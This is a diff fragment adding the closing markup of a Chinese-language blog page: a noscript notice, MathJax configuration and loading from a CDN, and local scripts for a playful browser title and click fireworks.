+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
